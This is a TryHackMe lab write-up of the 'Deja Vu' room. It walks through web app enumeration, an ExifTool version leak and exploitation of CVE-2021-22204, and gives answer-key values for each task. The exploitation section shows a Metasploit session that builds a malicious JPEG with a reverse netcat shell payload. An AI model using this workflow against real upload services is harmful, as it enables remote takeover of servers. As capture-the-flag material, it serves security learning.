<h1 align="center">Deja Vu</h1>
<p align="center"><img width="80px" src=""><br>
2025, August 29<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>480</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Exploit a recent code injection vulnerability to take over a website full of cute dog pictures!</em>.<br>
Access it <a href=" ">here</a><br>
<img width="1200px" src="https://github.com/user-attachments/assets/7f6e0c49-0709-4a50-8810-350f7618a986"></p>


<h2>Task 1 . Deja Vu</h2>

<p><em>Answer the question below</em></p>

<p>1.1. Deploy the virtual machine, wait 3-5 minutes for it to boot.<br>
<code>No answer needed</code></p>


<h2>Task 2 . Dog Pictures - Exploring a webapp</h2>
<h3>Webapp Enumeration</h3>
<p>After our initial port scan, we find two open ports. As usual, SSH is not much use without credentials as it's up to date. This just leaves us with a web application to explore.<br>

From Nmap's service version detection, we know that the backend is built in Golang. This hopefully means dynamic content that we can explore.<br>

The first step in exploiting a webapp, like exploiting anything else, is reconnaissance. Exploring the webapp to discover functionality is critical for gaining a basic familiarity with the webapp and potentially how it works. Navigating the webapp without actively trying to exploit the functionality is called walking the happy path. You can learn more about this technique (and a lot more) in this room: Walking An Application.<br>

Open up Burp Suite with your browser of choice (I like the integrated Chromium) and we can start exploring the site.</p>

<p><em>Answer the questions below</em></p>

<p>2.1. Click around the website. Can you find any developer comments?<br>
<code>No answer needed</code></p>

<p>2.2. Can you find the page that gives more details about a dog photo?<br>
<code>No answer needed</code></p>

<p>2.3. Perform an Nmap scan of the target. What version of SSH is in use?<br>
<code>OpenSSH 8.0 (protocol 2.0)</code></p>

<h2>Task 3 . Vulnerability Discovery</h2>
<h3>Delving deeper</h3>

<h3>Discovering the overly versobe API</h3>
<p>Burp Suite's target site map should have discovered 2 API routes that the website uses to retrieve information about the dog pictures. One retrieves the title and caption, and the other is used to retrieve the date and author. The full paths have been redacted, so that you find them yourself.</p>

<p>It appears the API route used to retrieve the date and author does so with EXIF data, and uses Exiftool from the response. It appears the output of the command is simply serialised into JSON and sent to the client. This gives us a lot of information, notably the ExifTool version number. This is considered a vulnerability under the OWASP API Top 10, more specifically API3:2019 Excessive Data Exposure. Usually, exposing version numbers would be considered a low or informational rated issue but as we will discover it can have more serious consequences.</p>

<p><em>Answer the questions below</em></p>

<p>3.1. What page can be used to upload your own dog picture? Hint : Try a gobuster scan as suggested!<br>
<code>/upload/</code></p>

<p>3.2. What API route is used to provide the Title and Caption for a specific dog image? Hint : Check the BurpSuite Target site map!<br>
<code>/dog/getmetadata</code></p>

<p>3.3. What API route does the application use to retrieve further information about the dog picture?<br>
<code>/dog/getexifdata</code></p>

<p>3.4. What attribute in the JSON response from this endpoint specifies the version of ExifTool being used by the webapp? Hint : Look at the API endpoint from the last question in BurpSuite's target map<br>
<code>ExifToolVersion</code>

<p>3.5. What version of ExifTool is in use?<br>
<code>12.23</code>

<p>3.6. What RCE exploit is present in this version of ExifTool? Give the CVE number in format CVE-XXXX-XXXXX<br>
<code>CVE-2021-22204</code>

<br>

<img width="1121" height="367" alt="image" src="https://github.com/user-attachments/assets/3b7ca6f6-ad5d-4ec1-b0e3-b6aaf23cb588" />

<img width="1122" height="260" alt="image" src="https://github.com/user-attachments/assets/cf20d8ea-5625-4cae-8546-83f1490030e6" />

<img width="1123" height="261" alt="image" src="https://github.com/user-attachments/assets/b9a560c9-0059-49d6-a703-0d5ae8afc7ad" />

<img width="474" height="196" alt="image" src="https://github.com/user-attachments/assets/d8ba91d2-4523-48c4-af24-35b9c7182ac1" />

<img width="1196" height="191" alt="image" src="https://github.com/user-attachments/assets/8557a749-e9a7-4813-b3f9-6dfad93a8287" />

<img width="1186" height="198" alt="image" src="https://github.com/user-attachments/assets/701f36a5-7056-4b8b-8ece-3cc28e59ac0c" />

<h2>Task 4 . Exploitation</h2>
<p>Now that we've discovered a potential method of exploiting the box, we should try it!<br>

Turning our version disclosure into remote code execution massively increases the severity of the issue.</p>

<h3>Why is this exploit interesting?</h3>
<p>In the Microsoft ecosystem, there's a concept called "Patch Tuesday"; security patches for Microsoft products are often released on Tuesdays.<br>
Practically immediately after these patches are released, work begins on creating exploits for the vulnerabilities as many systems will not be immediately updated.<br>

Exiftool follows a similar story here. In early 2021, an exploit was discovered in Exiftool that could lead to arbitrary code execution. The exploit was quickly patched before public proof of concept code started to appear, however many security enthusiasts began to reverse engineer the patch to create an exploit.</p>

<h3>Looking for the patch</h3>
<p>Researching the vulnerability, we can see it was assigned CVE-2021-22204. Looking at the NVD CVE page for the flaw shows that it was patched in 12.24. The page also has a link to the patch, which is very useful here because we can see how they fixed the vulnerability. The git diff is copied below.</p>



<h3>Understanding the code, and the danger</h3>h3>
<p>The dangerous function here is the call to eval on line 233. Eval is used to run Perl code that's contained in a variable, and the variable comes from EXIF data in our image. Control over code that's executed is our goal, so it currently seems like the only barrier between us and arbitrary code execution is the filter found on line 231.</p>



<p>It's worth explaining the =~ that's used here. It's a Perl operator usually used with regular expressions, and it can be very very complicated. Importantly for us, the first character after the ~ is 's'. This means that the operator will perform a search and replace with the regular expression that follows.<br>

That regular expression is also very complicated, unfortunately. There's a helpful comment explaining the intent, escaping special characters in the string. Another unfortunate discovery, if we look at the source code surrounding our filter which wasn't captured in the diff, is that this filter also relies on quote marks delimiting the ends of fields.<br>

Combining all this information, we can see how a code injection vulnerability would arise if we can bypass the filter and have Perl eval our own code. As this filter is irritating and the exploit is somewhat complex to engineer, we'll simply use Metasploit to craft our exploit. Articles describing how an exploit was created manually are included later.</p>

<h3>Creating our exploit with Metasploit</h3>
<p>To create our exploit, we need to first find the Metasploit module for this vulnerability. If you're unfamiliar with locating exploits in Metasploit, try the TryHackMe Metasploit Intro room.

We then need to set our options appropriately for a reverse shell payload. As it's a Perl command injection vulnerability, we want a command payload rather than a binary payload. Make sure your LHOST is correct and make sure you start a netcat listener!</p>

```bash
msf6 > search exiftool

Matching Modules
================

   #  Name                                                      Disclosure Date  Rank       Check  Description
   -  ----                                                      ---------------  ----       -----  -----------
   0  exploit/unix/fileformat/exiftool_djvu_ant_perl_injection  2021-05-24       excellent  No     ExifTool DjVu ANT Perl injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/fileformat/exiftool_djvu_ant_perl_injection

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > show options

Module options (exploit/unix/fileformat/exiftool_djvu_ant_perl_injection):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.jpg          yes       Output file


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.147.128  yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   JPEG file


msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > 
```

<h3>More information</h3>

```bash
msf6 exploit(unix/fileformat/exiftool_djvu_ant_perl_injection) > run
[+] msf.jpg stored at /root/.msf4/local/msf.jpg
```

<img width="1120" height="287" alt="image" src="https://github.com/user-attachments/assets/02b6e807-1cfa-48a7-bede-5b1672050e13" />

<img width="1121" height="219" alt="image" src="https://github.com/user-attachments/assets/3377dc3e-754c-4ab6-9fcf-3e30b236c370" />

<br>
<h2 align="center">Completed</h2>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/34fd9940-751c-4c57-916b-66e2b1c6ac87"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/9e4c2edb-c5a6-453b-9934-a9a08314027f"></p>


<h2 align="center">My TryHackMe Journey</h2>

<div align="center">

| Date              | Streak   | All Time     | All Time     | Monthly     | Monthly    | Points   | Rooms     | Badges    |
| :---------------: | :------: | :----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
|                   |          |    Global    |    Brazil    |    Global   |   Brazil   |          | Completed |           |
| 2025, August 29   | 480      |     111ˢᵗ    |      5ᵗʰ     |     238ᵗʰ   |    5ᵗʰ    | 123,336  |    933    |    73     |

</div>

<p align="center">Global All Time:   111ˢᵗ<br><img width="250px" src="https://github.com/user-attachments/assets/a638bd45-3b13-4c4c-97c5-2467fd2c4b2d"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/d129cd57-3a73-4234-8dbf-6dfe8d09b26b"><br><br>
                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/d5b9a0e6-aa08-4b2a-9be8-dbfda497f8f6"><br>
                  Global monthly:    238ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/077037e2-fe26-4ea5-8912-b4a65ffe4d0c"><br>
                  Brazil monthly:      5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/56714663-2098-4409-a1b2-be3cbe20b3a1"><br>

<h2>Thanks for coming!</h2>
<p align="left">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
